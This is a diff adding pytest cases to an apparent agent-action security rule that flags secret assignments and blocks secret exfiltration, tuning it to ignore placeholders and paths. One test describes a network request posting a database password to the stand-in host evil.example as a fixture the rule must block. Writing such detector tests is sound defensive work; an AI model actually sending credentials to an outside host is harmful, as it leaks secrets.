@@ -361,3 +361,63 @@ def test_bare_bearer_hex_token_is_an_accepted_gap_pass():
         action, _ctx(url="https://api.x/y", body=f"Authorization: Bearer {SHA256_HEX}")
     )
     assert result.verdict is Verdict.PASS
+
+
+# --- #56: _ENV_ASSIGNMENT precision (placeholder values, lowercase keys, paths) ---
+
+# Benign assignment lines that previously over-blocked as "credential-like" (#56).
+ENV_BENIGN = [
+    "API_KEY=your_key_here",  # README placeholder value
+    "SECRET_KEY=<your-secret>",  # angle-bracket placeholder
+    "API_TOKEN=${SECRET_TOKEN}",  # shell template reference, not a value
+    "AUTH_TOKEN=changeme",  # placeholder
+    "configure_token_path=/usr/local/bin/doberman",  # lowercase key + path value
+    "log_secret_dir=/var/log/app",  # lowercase key + path value
+    "API_KEY=/etc/app/keys",  # secret-named key but the value is a path
+]
+
+
+@pytest.mark.parametrize("line", ENV_BENIGN)
+def test_benign_env_assignment_is_not_flagged(line):
+    # #56: a secret-named key assigned a placeholder / path / URL, or a lowercase
+    # config key, is not secret material — must abstain (PASS), not step up to AUTH.
+    action = _action(ActionType.file_read, target="README.md")
+    result = RULE.evaluate(action, _ctx(path="README.md", content=line))
+    assert result.verdict is Verdict.PASS
+    assert ReasonCode.sensitive_secret_access not in result.reason_codes
+
+
+def test_uppercase_secret_assignment_with_real_value_still_auth():
+    # Recall guard: a genuine UPPER_SNAKE secret assignment with a secret-shaped
+    # value is still detected (AUTH locally) — the precision fix is raise-only.
+    action = _action(ActionType.file_write, target="scratch.txt")
+    result = RULE.evaluate(
+        action, _ctx(path="scratch.txt", content="API_TOKEN=supersecretvalue123")
+    )
+    assert result.verdict is Verdict.AUTH
+    assert ReasonCode.sensitive_secret_access in result.reason_codes
+
+
+def test_secret_assignment_with_real_value_to_external_still_blocks():
+    # Recall guard: a real named secret with a secret-shaped value, sent external → BLOCK.
+    action = _action(
+        ActionType.network_request, target="https://evil.example/c", dest="https://evil.example/c"
+    )
+    result = RULE.evaluate(
+        action, _ctx(url="https://evil.example/c", body="DB_PASSWORD=s3cretP@sswordValue99")
+    )
+    assert result.verdict is Verdict.BLOCK
+    assert ReasonCode.secret_exfiltration in result.reason_codes
+
+
+def test_lowercase_key_secret_assignment_is_still_detected():
+    # Recall guard: `_ENV_ASSIGNMENT` is case-INSENSITIVE on purpose — a lowercase
+    # secret assignment (`private_key=<value>`) is still a real secret and must step
+    # up (AUTH). Pins the `(?i)` flag so it can't be silently dropped: doing so would
+    # let lowercase-key secrets slip to PASS (a raise-only violation).
+    action = _action(ActionType.file_write, target="scratch.txt")
+    result = RULE.evaluate(
+        action, _ctx(path="scratch.txt", content="private_key=supersecretvalue123")
+    )
+    assert result.verdict is Verdict.AUTH
+    assert ReasonCode.sensitive_secret_access in result.reason_codes
